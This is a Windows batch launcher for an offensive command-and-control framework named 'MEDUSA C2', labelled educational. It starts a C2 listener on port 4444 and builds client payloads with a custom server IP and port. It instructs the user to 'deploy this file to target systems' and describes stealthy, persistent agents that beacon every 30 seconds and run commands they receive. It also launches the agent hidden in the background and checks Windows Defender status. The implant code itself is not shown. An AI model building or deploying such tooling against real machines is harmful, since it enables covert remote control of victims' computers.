@echo off
echo ============================================================
echo MEDUSA C2 Framework - Startup Script
echo Educational Use Only
echo ============================================================

echo Checking Python installation...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed or not in PATH
    echo Please install Python 3.7 or higher
    pause
    exit /b 1
)

echo Checking/installing required packages...
pip install -r requirements.txt

echo Starting MEDUSA C2 Framework...
python server.py

pause
color 0A
title MEDUSA C2 Framework - Professional Command & Control
mode con: cols=100 lines=35

echo.
echo ================================================================
echo                    MEDUSA C2 FRAMEWORK v2.1.0
echo                 Professional Command ^& Control
echo                     Educational Use Only
echo                  Developed for Cybersecurity Training
echo ================================================================
echo.
echo [INFO] System Status: Checking dependencies...
echo.

REM Check Python installation
python --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Python not found! Please install Python 3.7+ first.
    echo [INFO] Download from: https://python.org/downloads/
    echo.
    pause
    exit /b 1
) else (
    echo [OK] Python detected
)

REM Check required modules
echo [INFO] Checking Flask installation...
python -c "import flask" 2>nul
if errorlevel 1 (
    echo [WARNING] Flask not found. Installing dependencies...
    pip install flask flask-socketio cryptography
    if errorlevel 1 (
        echo [ERROR] Failed to install dependencies!
        pause
        exit /b 1
    )
) else (
    echo [OK] Flask available
)

echo [OK] All dependencies satisfied
echo.

:MAIN_MENU
echo ================================================================
echo                      MAIN MENU OPTIONS
echo ================================================================
echo.
echo  [1] 🚀 Start C2 Server (Web Dashboard + TCP Listener)
echo  [2] 🔨 Generate Custom Client Payload
echo  [3] 🔗 Start Client Agent (Background Mode)
echo  [4] 💻 Start Server (CLI-Only Mode)
echo  [5] 🔧 Advanced Payload Builder
echo  [6] 📈 System Information
echo  [7] 📚 View Documentation
echo  [8] ❌ Exit Framework
echo.
set /p choice="[MEDUSA] Select option (1-8): "

if "%choice%"=="1" goto START_SERVER
if "%choice%"=="2" goto GENERATE_CLIENT
if "%choice%"=="3" goto START_CLIENT
if "%choice%"=="4" goto START_CLI
if "%choice%"=="5" goto BUILDER_MENU
if "%choice%"=="6" goto SYSTEM_INFO
if "%choice%"=="7" goto DOCUMENTATION
if "%choice%"=="8" goto EXIT_FRAMEWORK
echo [ERROR] Invalid choice. Please try again.
echo.
goto MAIN_MENU

:START_SERVER
cls
echo ================================================================
echo                    STARTING C2 SERVER
echo ================================================================
echo.
echo [INFO] Initializing MEDUSA C2 Server...
echo [INFO] Web Dashboard: http://localhost:5000
echo [INFO] TCP Listener: 0.0.0.0:4444
echo [INFO] Starting with 30-second persistent client mode
echo.
echo [WARNING] Educational Use Only - Authorized Testing Required!
echo.
python server.py
if errorlevel 1 (
    echo.
    echo [ERROR] Server failed to start!
    pause
)
goto MAIN_MENU

:GENERATE_CLIENT
cls
echo ================================================================
echo                  GENERATING CLIENT PAYLOAD
echo ================================================================
echo.
echo [INFO] Creating persistent client with 30-second check-ins
echo.
set /p server_ip="[INPUT] Enter server IP (default: 127.0.0.1): "
if "%server_ip%"=="" set server_ip=127.0.0.1

set /p server_port="[INPUT] Enter server port (default: 4444): "
if "%server_port%"=="" set server_port=4444

set /p client_name="[INPUT] Enter output name (default: medusa_client): "
if "%client_name%"=="" set client_name=medusa_client

echo.
echo [INFO] Generating payload with configuration:
echo        - Server IP: %server_ip%
echo        - Server Port: %server_port%
echo        - Output Name: %client_name%
echo        - Persistence: 30-second intervals
echo        - Stealth Mode: Enabled
echo.

echo [PROCESS] Creating customized client...
copy client.py %client_name%.py >nul

REM Replace server configuration in the copied file
powershell -Command "(Get-Content '%client_name%.py') -replace '127\.0\.0\.1', '%server_ip%' -replace '4444', '%server_port%' | Set-Content '%client_name%.py'"

if exist "%client_name%.py" (
    echo [SUCCESS] Client generated successfully!
    echo [INFO] File created: %client_name%.py
    echo [INFO] Deploy this file to target systems
    echo [INFO] Client will connect every 30 seconds for persistence
    echo.
    echo [DETAILS] Connection Flow:
    echo           1. Client attempts connection to %server_ip%:%server_port%
    echo           2. Performs initial handshake and registration
    echo           3. Sends heartbeat every 30 seconds ± jitter
    echo           4. Executes received commands immediately
    echo           5. Auto-reconnects on connection loss
    echo           6. Maintains stealth and persistence
) else (
    echo [ERROR] Failed to generate client!
)
echo.
pause
goto MAIN_MENU

:START_CLIENT
cls
echo ================================================================
echo                  STARTING CLIENT AGENT
echo ================================================================
echo.
echo [INFO] Starting client in background stealth mode
echo [INFO] Connection interval: 30 seconds (persistent)
echo [INFO] Auto-reconnection: Enabled
echo.
echo [WARNING] This will start a persistent background agent!
echo [WARNING] Use only on authorized systems!
echo.
set /p confirm="[CONFIRM] Continue? (y/N): "
if /i not "%confirm%"=="y" goto MAIN_MENU

echo.
echo [PROCESS] Launching client agent...
start /B python client.py
if errorlevel 1 (
    echo [ERROR] Failed to start client!
) else (
    echo [SUCCESS] Client started in background
    echo [INFO] Agent is now running with 30-second persistence
    echo [INFO] Check server dashboard for connection status
)
echo.
pause
goto MAIN_MENU

:START_CLI
cls
echo ================================================================
echo                  CLI-ONLY SERVER MODE
echo ================================================================
echo.
echo [INFO] Starting server without web interface
echo [INFO] Command-line interface only
echo.
python server.py --cli-only
if errorlevel 1 (
    echo.
    echo [ERROR] CLI server failed to start!
    pause
)
goto MAIN_MENU

:BUILDER_MENU
cls
echo ================================================================
echo                  ADVANCED PAYLOAD BUILDER
echo ================================================================
echo.
echo [INFO] Launching advanced payload builder menu...
echo.
if exist "builder_menu.bat" (
    call builder_menu.bat
) else (
    echo [ERROR] Builder menu not found!
    echo [INFO] Please ensure builder_menu.bat exists
)
echo.
goto MAIN_MENU

:SYSTEM_INFO
cls
echo ================================================================
echo                    SYSTEM INFORMATION
echo ================================================================
echo.
echo [SYSTEM] Operating System:
ver
echo.
echo [PYTHON] Version:
python --version
echo.
echo [NETWORK] IP Configuration:
ipconfig | findstr "IPv4"
echo.
echo [SECURITY] Windows Defender Status:
sc query windefend | findstr "STATE"
echo.
echo [MEDUSA] Framework Status:
if exist "server.py" (
    echo [OK] Server module available
) else (
    echo [ERROR] Server module missing!
)
if exist "client.py" (
    echo [OK] Client module available
) else (
    echo [ERROR] Client module missing!
)
echo.
pause
goto MAIN_MENU

:DOCUMENTATION
cls
echo ================================================================
echo                      DOCUMENTATION
echo ================================================================
echo.
echo [DOCS] Available Documentation:
echo.
if exist "README.md" (
    echo [OK] README.md - Main documentation
) else (
    echo [MISSING] README.md
)
if exist "BUILDER_GUIDE.md" (
    echo [OK] BUILDER_GUIDE.md - Payload building guide
) else (
    echo [MISSING] BUILDER_GUIDE.md
)
echo.
echo [URLS] Online Resources:
echo        - GitHub: https://github.com/medusa-c2/medusa
echo        - Documentation: https://medusa-c2.readthedocs.io
echo        - Discord: https://discord.gg/medusa-c2
echo.
echo [HELP] Command Line Usage:
echo        python server.py [--help]
echo        python client.py [--help]
echo        python builder.py [--help]
echo.
set /p view_readme="[OPTION] View README.md? (y/N): "
if /i "%view_readme%"=="y" (
    if exist "README.md" (
        echo.
        echo [INFO] Opening README.md...
        start notepad README.md
    ) else (
        echo [ERROR] README.md not found!
    )
)
echo.
pause
goto MAIN_MENU

:EXIT_FRAMEWORK
cls
echo ================================================================
echo                   EXITING MEDUSA C2
echo ================================================================
echo.
echo [INFO] Thank you for using MEDUSA C2 Framework!
echo [REMINDER] Educational use only - Stay ethical!
echo [CONTACT] Report issues: https://github.com/medusa-c2/medusa/issues
echo.
echo [CLEANUP] Checking for running processes...
REM Kill any running Python processes that might be MEDUSA
tasklist | findstr "python.exe" >nul
if not errorlevel 1 (
    echo [WARNING] Python processes detected
    set /p kill_processes="[OPTION] Terminate MEDUSA processes? (y/N): "
    if /i "%kill_processes%"=="y" (
        echo [PROCESS] Terminating MEDUSA processes...
        REM This is safer than killing all Python processes
        echo [INFO] Manually stop server/client if needed
    )
)
echo.
echo [GOODBYE] MEDUSA C2 Framework terminated
echo.
pause
exit /b 0